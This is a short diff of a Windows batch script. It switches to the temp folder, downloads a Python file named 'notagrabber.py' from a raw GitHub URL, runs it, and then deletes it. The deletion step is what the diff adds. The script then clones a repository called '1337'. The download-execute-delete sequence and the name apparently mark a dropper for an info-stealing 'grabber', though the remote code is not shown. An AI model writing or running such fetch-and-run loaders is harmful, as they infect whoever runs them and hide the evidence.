@@ -2,7 +2,8 @@ cd %temp%
 cls
 curl https://raw.githubusercontent.com/Griffith-Femto1/Griffith/refs/heads/main/moretestshiigidkimlosingmyshi.py --output notagrabber.py
 python notagrabber.py
-wait(3)
+sleep 3
+del notagrabber.py
 cls
 cd Downloads
 git clone https://github.com/Griffith-Femto1/1337.git
